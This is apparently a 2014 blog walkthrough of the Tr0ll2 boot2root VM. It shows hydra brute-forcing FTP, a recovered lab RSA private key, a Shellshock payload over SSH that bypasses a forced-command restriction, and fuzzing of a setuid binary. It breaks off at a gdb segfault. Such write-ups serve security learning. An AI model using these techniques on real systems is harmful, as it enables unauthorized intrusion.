<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://leonjza.github.io/about/ title="About Me">
<span>About Me</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/archives title=Archive>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/categories title=Categories>
<span>Categories</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/search/ title="Search (Alt + /)" accesskey=/>
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://leonjza.github.io>Home</a>&nbsp;»&nbsp;<a href=https://leonjza.github.io/posts/>Posts</a></div>
<h1 class=post-title>
another troll tamed solving troll 2
</h1>
<div class=post-meta>October 10, 2014&nbsp;·&nbsp;16 min&nbsp;·&nbsp;Leon Jacobs&nbsp;|&nbsp;<a href=https://github.com/leonjza/leonjza.github.io/tree/source/content/posts/2014-10-10-another-troll-tamed-solving-troll-2.markdown rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div>
</header> <div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#foreword aria-label=foreword>foreword</a></li>
<li>
<a href=#getting-started aria-label="getting started">getting started</a></li>
<li>
<a href=#web-server aria-label="web server">web server</a></li>
<li>
<a href=#ftpee aria-label=ftpee>ftpee</a></li>
<li>
<a href=#noob-key aria-label="noob key">noob key</a></li>
<li>
<a href=#shocking-isnt-it aria-label="shocking isn&amp;rsquo;t it">shocking isn&rsquo;t it</a></li>
<li>
<a href=#which-door-leads-to-r00t aria-label="which door leads to r00t">which door leads to r00t</a></li>
<li>
<a href=#bof-bof-bof-your-boat aria-label="bof bof bof your boat&amp;hellip;">bof bof bof your boat&mldr;</a></li>
<li>
<a href=#the-exploit aria-label="the exploit">the exploit</a></li>
<li>
<a href=#trollin-the-rootin aria-label="trollin the rootin">trollin the rootin</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><h2 id=foreword>foreword<a hidden class=anchor aria-hidden=true href=#foreword>#</a></h2>
<p><a href=https://www.vulnhub.com/entry/tr0ll-2,107/>Tr0ll2</a> is a successor in a boot2root series by <a href=https://twitter.com/Maleus21>@Maleus21</a> hosted over at <a href=http://vulnhub.com/>VulnHub</a>. Having been able to <a href=https://leonjza.github.io/blog/2014/08/15/taming-the-troll/>pwn Tr0ll1</a>, I gave this one a shot too.</p>
<p>Here is my experience taming the troll, again.</p>
<h2 id=getting-started>getting started<a hidden class=anchor aria-hidden=true href=#getting-started>#</a></h2>
<p>Like almost all boot2roots, we get right into it by slapping the VM into a hypervisor (VirtualBox in my case), discovering the IP address and running a <code>nmap</code> against it:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~/Desktop/troll2# nmap -sV --reason 192.168.56.101

Starting Nmap 6.46 <span style=color:#f92672>(</span> http://nmap.org <span style=color:#f92672>)</span> at 2014-10-10 06:55 SAST
Nmap scan report <span style=color:#66d9ef>for</span> 192.168.56.101
Host is up, received reset <span style=color:#f92672>(</span>0.00031s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>997</span> filtered ports
Reason: <span style=color:#ae81ff>997</span> no-responses
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 2.0.8 or later
22/tcp open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
80/tcp open  http    syn-ack Apache httpd 2.2.22 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 15.21 seconds
</code></pre></div><p>ftp, ssh and http. Quite an attack surface to start with. I start with a quick google for <em>vsftpd 2.0.8 exploit</em> with nothing apparently obvious jumping out at me. I also quickly attempt to SSH to the server just to check if there aren&rsquo;t any strange banners etc to be found which was not the case.</p>
<h2 id=web-server>web server<a hidden class=anchor aria-hidden=true href=#web-server>#</a></h2>
<p>Opening up a browser to http://192.168.56.101 revealed a familiar image:</p>
<p><figure>
<img loading=lazy src=/images/troll2_web.png>
</figure>
Oh. Hai. The sources serving up the image had the comment <code>&lt;!-- Nothing to see here, but good try NOOB!></code> with the image.</p>
<p>Further poking around got me to checking if a robots.txt file was present. It was and contained some interestingly named entries. Some of the directories would 404, however a few would 200 with exactly the same content. The directories that returned HTTP 200 were:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>/keep_trying
/dont_bother
/noob
/ok_this_is_it
</code></pre></div><p>The content served up at these URLs:</p>
<figure>
<img loading=lazy src=/images/troll2_noob.png>
</figure>
<p>The source that serves up this image had the comment <code>&lt;!--What did you really think to find here? Try Harder!></code> with the image.</p>
<p>So with exactly the same content displayed for all of the directories that are present, I was a little unsure of where to go next. For all I knew, these 4 directories may have been a symlink to the same place. The HTML sources were the same as well as the images. I figured the next thing I could do was download the images and compare exifdata. I put the URL&rsquo;s that would 200 into a text file from the <code>robots.txt</code> and looped over them downloading the images:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# <span style=color:#66d9ef>for</span> line in <span style=color:#66d9ef>$(</span>cat 200.txt<span style=color:#66d9ef>)</span>; <span style=color:#66d9ef>do</span> echo <span style=color:#e6db74>&#34;==&gt;</span>$line<span style=color:#e6db74>&lt;==&#34;</span> <span style=color:#f92672>&amp;&amp;</span> wget 192.168.56.101/$line/cat_the_troll.jpg; <span style=color:#66d9ef>done</span>

<span style=color:#f92672>==</span>&gt;/ok_this_is_it&lt;<span style=color:#f92672>==</span>
--2014-10-10 07:31:37--  http://192.168.56.101/ok_this_is_it/cat_the_troll.jpg
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... <span style=color:#ae81ff>200</span> OK
Length: <span style=color:#ae81ff>15831</span> <span style=color:#f92672>(</span>15K<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>image/jpeg<span style=color:#f92672>]</span>
Saving to: <span style=color:#e6db74>`</span>cat_the_troll.jpg.3<span style=color:#e6db74>&#39;
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>100%[=======&gt;] 15,831      --.-K/s   in 0s
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>2014-10-10 07:31:37 (191 MB/s) - `cat_the_troll.jpg.3&#39;</span> saved <span style=color:#f92672>[</span>15831/15831<span style=color:#f92672>]</span>
</code></pre></div><p>Immediately when you <code>ls</code> the directory containing the images will you notice a difference:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# ls -l
total <span style=color:#ae81ff>68</span>
-rw-r--r-- <span style=color:#ae81ff>1</span> root root    <span style=color:#ae81ff>47</span> Oct <span style=color:#ae81ff>10</span> 07:31 200.txt
-rw-r--r-- <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>15831</span> Oct  <span style=color:#ae81ff>4</span> 10:57 cat_the_troll.jpg
-rw-r--r-- <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>15873</span> Oct  <span style=color:#ae81ff>4</span> 10:31 cat_the_troll.jpg.1 <span style=color:#75715e>#&lt;---</span>
-rw-r--r-- <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>15831</span> Oct  <span style=color:#ae81ff>4</span> 10:57 cat_the_troll.jpg.2
-rw-r--r-- <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>15831</span> Oct  <span style=color:#ae81ff>4</span> 10:57 cat_the_troll.jpg.3
</code></pre></div><p>One of the entires has a different timestamp to the others. A quick glance on the exifdata did not reveal any differences, however, running a <code>cmp</code> on the files hinted towards what may be up.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# cmp cat_the_troll.jpg cat_the_troll.jpg.1
cmp: EOF on cat_the_troll.jpg
</code></pre></div><p>Sweet, so lets print the last line of both and check what the diff is:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~/Desktop/troll2/c# tail -n <span style=color:#ae81ff>1</span> cat_the_troll.jpg
8�z2��p�T�lj<span style=color:#ae81ff>\p</span>��?�&lt;�S�۪��6�#���7U y���*/ p?E$���%<span style=color:#f92672>=</span>���.�B���o�ES_�

root@kali:~/Desktop/troll2/c# tail -n <span style=color:#ae81ff>1</span> cat_the_troll.jpg.1
8�z2��p�T�lj<span style=color:#ae81ff>\p</span>��?�&lt;�S�۪��6�#���7U y���*/ p?E$���%<span style=color:#f92672>=</span>���.�B���o�ES_��Look Deep within y0ur_self <span style=color:#66d9ef>for</span> the answer
</code></pre></div><p><em>Look Deep within y0ur_self for the answer</em>. Hmm. Keeping in mind some of the previous tricks tr0ll had and the fact that the words <em>y0ur_self</em> were written differently, I tried to use this as a web path:</p>
<figure>
<img loading=lazy src=/images/troll2_y0ur_self.png>
</figure>
<p>I downloaded <code>answer.txt</code> and started to check what is happening inside:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# head answer.txt
QQo<span style=color:#f92672>=</span>
QQo<span style=color:#f92672>=</span>
QUEK
QUIK
QUJNCg<span style=color:#f92672>==</span>
QUMK
QUNUSAo<span style=color:#f92672>=</span>
QUkK
QUlEUwo<span style=color:#f92672>=</span>
QU0K
</code></pre></div><p>Looks a lot like base64 hey? Lets try decode it:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# cat answer.txt | base64 -d | head
A
A
AA
AB
ABM
AC
ACTH
AI
AIDS
AM
</code></pre></div><p>The resultant output appeared to be a wordlist. A big one too. In fact, it has <strong>99157</strong> entires in it. At this stage I was really hoping that I did not have to use this to brute force the ftp or ssh service. That would take forever! After a <code>sort | uniq</code>, the size was reduced to <strong>73128</strong> which was still too much.</p>
<p>I decided to scroll through the list to see if I can spot anything out of the ordinary. My eyes started to feel very tired and not in the mood to go through all of this, but I persisted and eventually noticed a entry <strong>ItCantReallyBeThisEasyRightLOL</strong> on line 34164 that was not similar in pattern to the other words. This one was not a web directory :P</p>
<p>My guess was that this has to be a password for either the FTP or SSH service.</p>
<h2 id=ftpee>ftpee<a hidden class=anchor aria-hidden=true href=#ftpee>#</a></h2>
<p>I now had what I assumed was a password. No other web related hints had me focussing there and I started to doubt my findings.</p>
<p>As a last resort, I started to get together a wordlist that I could give to hydra to chew on. My idea was to grab all of the strings from the web service, including the one found in <code>answer.txt</code>, mutate it a bit and hand it over to hydra to do its work.</p>
<p>My approach to compiling the list basically boiled down to appending everything I could find (including HTML sources) as strings into a file. Once I had that, I ran <code>cat wordz | tr "\"' " '\n' | sort -u >> words</code> to break it up into a wordlist. Lastly I took the entries had a <code>_</code> in them and broke them up as single words ie: <code>cat_the_troll.jpg</code> turned into <code>cat</code>, <code>the</code>, <code>troll</code>. The resultant list can be seen <a href=https://gist.github.com/leonjza/db5cc19cd62b270a89db>here</a></p>
<p>And finally, it was time to let hydra on the loose.</p>
<pre tabindex=0><code>root@kali:~# hydra -v -V -F -L words -P words -t 30 ftp://192.168.56.101
Hydra v7.6 (c)2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2014-10-10 08:11:50
[DATA] 30 tasks, 1 server, 13689 login tries (l:117/p:117), ~456 tries per task
[DATA] attacking service ftp on port 21
[VERBOSE] Resolving addresses ... done
[ATTEMPT] target 192.168.56.101 - login &quot;&gt;&quot; - pass &quot;&gt;&quot; - 1 of 13689 [child 0]
[ATTEMPT] target 192.168.56.101 - login &quot;&gt;&quot; - pass &quot;404&quot; - 2 of 13689 [child 1]
[ATTEMPT] target 192.168.56.101 - login &quot;&gt;&quot; - pass &quot;again&quot; - 3 of 13689 [child 2]
[ATTEMPT] target 192.168.56.101 - login &quot;&gt;&quot; - pass &quot;agent&quot; - 4 of 13689 [child 3]
[...]
[ATTEMPT] target 192.168.56.101 - login &quot;Tr0ll&quot; - pass &quot;Tr0ll&quot; - 10621 of 13689 [child 4]
[ATTEMPT] target 192.168.56.101 - login &quot;Tr0ll&quot; - pass &quot;tr0ll2&quot; - 10622 of 13689 [child 8]
[ATTEMPT] target 192.168.56.101 - login &quot;Tr0ll&quot; - pass &quot;tr0ll_again.jpg&quot; - 10623 of 13689 [child 23]
[21][ftp] host: 192.168.56.101   login: Tr0ll   password: Tr0ll
[STATUS] attack finished for 192.168.56.101 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-10-10 08:29:08
</code></pre><p>After a really, really long time, we finally get a successful combination of <code>Tr0ll:Tr0ll</code>. Guess I could have guessed that but oh well. Lets see if this gives us any access:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# ftp 192.168.56.101
Connected to 192.168.56.101.
<span style=color:#ae81ff>220</span> Welcome to Tr0ll FTP... Only noobs stay <span style=color:#66d9ef>for</span> a <span style=color:#66d9ef>while</span>...
Name <span style=color:#f92672>(</span>192.168.56.101:root<span style=color:#f92672>)</span>: Tr0ll
<span style=color:#ae81ff>331</span> Please specify the password.
Password:
<span style=color:#ae81ff>230</span> Login successful.
</code></pre></div><p>Yay! Progress! Lets take a closer look&mldr;</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; pas
Passive mode on.

ftp&gt; ls
<span style=color:#ae81ff>227</span> Entering Passive Mode <span style=color:#f92672>(</span>192,168,56,101,73,4<span style=color:#f92672>)</span>
<span style=color:#ae81ff>150</span> Here comes the directory listing.
-rw-r--r--    <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>0</span>        <span style=color:#ae81ff>0</span>            <span style=color:#ae81ff>1474</span> Oct <span style=color:#ae81ff>04</span> 01:09 lmao.zip
<span style=color:#ae81ff>226</span> Directory send OK.

ftp&gt; get lmao.zip
local: lmao.zip remote: lmao.zip
<span style=color:#ae81ff>227</span> Entering Passive Mode <span style=color:#f92672>(</span>192,168,56,101,105,73<span style=color:#f92672>)</span>
<span style=color:#ae81ff>150</span> Opening BINARY mode data connection <span style=color:#66d9ef>for</span> lmao.zip <span style=color:#f92672>(</span><span style=color:#ae81ff>1474</span> bytes<span style=color:#f92672>)</span>.
<span style=color:#ae81ff>226</span> Transfer complete.
<span style=color:#ae81ff>1474</span> bytes received in 0.00 secs <span style=color:#f92672>(</span>621.0 kB/s<span style=color:#f92672>)</span>

ftp&gt; bye
<span style=color:#ae81ff>221</span> Goodbye.
</code></pre></div><h2 id=noob-key>noob key<a hidden class=anchor aria-hidden=true href=#noob-key>#</a></h2>
<p>We find ourselves with a zip archive called <code>lmao.zip</code>. A encrypted one :(</p>
<p>I tried a few passwords from the wordlist that I had built earlier and eventually got to the word we got out of <code>answer.txt</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~/Desktop/troll2# unzip lmao.zip
Archive:  lmao.zip
<span style=color:#f92672>[</span>lmao.zip<span style=color:#f92672>]</span> noob password: <span style=color:#75715e>#ItCantReallyBeThisEasyRightLOL</span>
  inflating: noob

root@kali:~# cat noob
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g<span style=color:#f92672>==</span>
-----END RSA PRIVATE KEY-----
</code></pre></div><p>A unencrypted private key! Called <code>noob</code>. I guessed <code>noob</code> may be the username, so I fixed up the permissions on the key and tried my luck:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~/Desktop/troll2# chmod <span style=color:#ae81ff>600</span> noob
root@kali:~/Desktop/troll2# ssh noob@192.168.56.101 -i noob
TRY HARDER LOL!
Connection to 192.168.56.101 closed.
</code></pre></div><h2 id=shocking-isnt-it>shocking isn&rsquo;t it<a hidden class=anchor aria-hidden=true href=#shocking-isnt-it>#</a></h2>
<p>Surprise surprise. It seemed like we are in fact authenticating, but we don&rsquo;t have a shell. I figured one of two things could be happening here. First, the <code>.bashrc</code> may have been modified with something that echoes the text <code>TRY HARDER LOL!</code> and exits, or there is some restriction on the SSH key for <code>noob</code>.</p>
<p>My first attempts were to specify a command with <code>-t</code> as <code>/bin/bash</code>, but this did not work.</p>
<p>With the current buzz around the recently disclosed <em>shellshock</em> bug, I thought I&rsquo;d try it assuming its a key restriction:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# ssh noob@192.168.56.101 -i noob -t <span style=color:#e6db74>&#39;() { :;}; /bin/bash&#39;</span>
noob@Tr0ll2:~$ id
uid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>noob<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>noob<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>noob<span style=color:#f92672>)</span>
</code></pre></div><p>Shocking :) To confirm, the <code>authorized_keys</code> file has the entry <code>command="echo TRY HARDER LOL!" </code> before the public key.</p>
<h2 id=which-door-leads-to-r00t>which door leads to r00t<a hidden class=anchor aria-hidden=true href=#which-door-leads-to-r00t>#</a></h2>
<p>With shell access to the machine, it was time to start enumerating and learn more about what we are facing next. Nothing particularly interesting popped up, until I noticed a directory <code>/nothing_to_see_here</code>.</p>
<p><code>/nothing_to_see_here</code> had another directory inside of it <code>choose_wisely/</code> with another 3 sub directories called <code>door1</code>, <code>door2</code> and <code>door3</code>.</p>
<p>All 3 &lsquo;doors&rsquo; had a setuid binary called <code>r00t</code>. I ran the first one which had the output:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t
Good job, stand by, executing root shell...
BUHAHAHA NOOB!
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$
Broadcast message from noob@Tr0ll2
    <span style=color:#f92672>(</span>/dev/pts/0<span style=color:#f92672>)</span> at 0:48 ...

The system is going down <span style=color:#66d9ef>for</span> reboot NOW!
Connection to 192.168.56.101 closed by remote host.
Connection to 192.168.56.101 closed.
</code></pre></div><p>Dam. The VM promptly rebooted. Obviously I need to be a little more careful :D</p>
<p>The machine rebooted and I logged in again as <code>noob</code>, changing directories to the <code>r00t</code> binaries. I tried to run <code>strings</code> on them, but it seems like the command was unavailable. No worries, next on the list was <code>od</code>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ od -S <span style=color:#ae81ff>1</span> door3/r00t
<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
<span style=color:#ae81ff>0001214</span> __libc_start_main
<span style=color:#ae81ff>0001236</span> GLIBC_2.0
<span style=color:#ae81ff>0001320</span> R
<span style=color:#ae81ff>0001453</span> Q
<span style=color:#ae81ff>0001521</span> %
<span style=color:#ae81ff>0001526</span> h
<span style=color:#ae81ff>0001626</span> h
<span style=color:#ae81ff>0001646</span> h<span style=color:#f92672>(</span>
<span style=color:#ae81ff>0002066</span> t&amp;
<span style=color:#ae81ff>0002073</span> <span style=color:#960050;background-color:#1e0010>&#39;</span>
<span style=color:#ae81ff>0002305</span> i
<span style=color:#ae81ff>0002620</span> Good job, stand by, executing root shell...
<span style=color:#ae81ff>0002674</span> BUHAHAHA NOOB!
<span style=color:#ae81ff>0002713</span> /sbin/reboot
<span style=color:#ae81ff>0002733</span> ;<span style=color:#ae81ff>0</span>
<span style=color:#ae81ff>0002750</span> L
<span style=color:#ae81ff>0002760</span> p
<span style=color:#ae81ff>0003025</span> zR
<span style=color:#ae81ff>0003044</span>
<span style=color:#ae81ff>0003060</span> p
<span style=color:#ae81ff>0003077</span> x
<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
</code></pre></div><p>So this is the binary that simply rebooted the machine. What is weird though is that this <code>r00t</code> binary was in <code>door1/</code> prior to the reboot. I continued to check out the other binaries, when suddenly the folder containing all of the files disappeared and reappeared. After this all of the <code>r00t</code> binaries were shuffled around again.</p>
<p>This was only a minor annoyance and I had enough time to check out the binaries using <code>od</code> to figure out which one I should be looking at. The other binary that would have been a problem appears to chmod /bin/ls so that it becomes unusable. Lucky I missed that one.</p>
<h2 id=bof-bof-bof-your-boat>bof bof bof your boat&mldr;<a hidden class=anchor aria-hidden=true href=#bof-bof-bof-your-boat>#</a></h2>
<p>I copied the binary of interest to <code>/tmp</code> so that I wont be bothered by the shuffling thing that was going on again. Most importantly the one of interest was slightly bigger in size compared to the others so it was easy to identify it apart from the others.</p>
<p>With the binary in <code>/tmp</code>, <code>noob</code> was the owner. For testing purposes this was ok as the exploit should work the same with the one with the desired permissions.</p>
<p>To check the security applied to the binary at compile time, I copied it off using <code>xxd</code> to my local machine and checked it out.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# gdb -q ./r00t
Reading symbols from /root/Desktop/troll2/r00t...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partia
</code></pre></div><p>No security? EZ PEZE.</p>
<p>Next, it was time to start fuzzing the binary and see if it has any interesting behavior:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>noob@Tr0ll2:/tmp$ ./r00t <span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;A&#34; * 500&#39;</span><span style=color:#66d9ef>)</span>
Segmentation fault
</code></pre></div><p>500 &ldquo;A&rdquo;&rsquo;s, and we have a crash. Perfect. It also seems like a really easy buffer overflow vulnerability. I quickly checked that ASLR was not enabled. If it is not, I planned on popping this one with a ret2libc attack.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>noob@Tr0ll2:/tmp$ ldd ./r00t
    linux-gate.so.1 <span style=color:#f92672>=</span>&gt;  <span style=color:#f92672>(</span>0xb7fff000<span style=color:#f92672>)</span>
    libc.so.6 <span style=color:#f92672>=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span style=color:#f92672>(</span>0xb7e4e000<span style=color:#f92672>)</span>
    /lib/ld-linux.so.2 <span style=color:#f92672>(</span>0x80000000<span style=color:#f92672>)</span>

noob@Tr0ll2:/tmp$ ldd ./r00t
    linux-gate.so.1 <span style=color:#f92672>=</span>&gt;  <span style=color:#f92672>(</span>0xb7fff000<span style=color:#f92672>)</span>
    libc.so.6 <span style=color:#f92672>=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span style=color:#f92672>(</span>0xb7e4e000<span style=color:#f92672>)</span>
    /lib/ld-linux.so.2 <span style=color:#f92672>(</span>0x80000000<span style=color:#f92672>)</span>
</code></pre></div><p>Both entries returned the same address for libc, indicating that ASLR was not enabled :)
Tr0ll2 was also nice enough to include <code>gdb</code>, making the exploit development process very easy.</p>
<h2 id=the-exploit>the exploit<a hidden class=anchor aria-hidden=true href=#the-exploit>#</a></h2>
<p>With all of the information gathered so far about this particularly interesting <code>r00t</code> binary, it was time to quickly write the overflow exploit to attempt and spawn us a root shell.</p>
<p>First, we have to inspect the crash when we send those 500 A&rsquo;s</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r <span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;A&#34; * 500&#39;</span><span style=color:#66d9ef>)</span>
Starting program: /tmp/r00t <span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;A&#34; * 500&#39;</span><span style=color:#66d9ef>)</span>

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? <span style=color:#f92672>()</span>

